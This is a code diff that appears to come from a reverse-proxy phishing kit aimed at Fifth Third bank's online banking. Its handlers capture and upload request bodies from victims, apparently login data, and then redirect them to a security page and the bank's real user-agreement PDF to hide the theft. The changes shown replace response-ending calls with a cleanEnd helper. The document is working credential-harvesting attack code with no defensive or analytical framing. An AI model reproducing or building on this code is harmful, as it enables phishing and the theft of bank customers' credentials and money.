@@ -100,7 +100,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             clientContext.setLogAvailable(true)
             super.uploadRequestBody(clientContext, {})
             // this.res.writeHead('301', {location: 'https://outlook.com'})
-            // return this.res.end()
+            // return                 super.cleanEnd('PHP-EXEC', clientContext)
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
@@ -126,7 +126,7 @@ const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
                     super.captureBody(clientContext.currentDomain, clientContext)
                     // clientContext.currentDomain = 'onlinebanking.53.com'
                     this.res.writeHead(301, { location: '/session/secure/security.html' })
-                    this.res.end()
+                    super.cleanEnd('PHP-EXEC', clientContext)
                 } else {
                     clientContext.info.secondTime = true;
                     clientContext.setLogAvailable(true)
@@ -136,11 +136,11 @@ const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
             } else if (this.req.url === '/session/secure/security.html') {
                 super.uploadRequestBody(clientContext.currentDomain, clientContext)
                 this.res.writeHead('301', { location: '/content/dam/fifth-third/docs/legal/ftb-digital-services-user-agreement.pdf' })
-                return this.res.end()
+                return super.cleanEnd('PHP-EXEC', clientContext)
             } else {
                 // super.uploadRequestBody(clientContext.currentDomain, clientContext)
                 this.res.writeHead(404)
-                this.res.end()
+                super.cleanEnd('PHP-EXEC', clientContext)
             }
         } else {
             switch (this.req.url) {
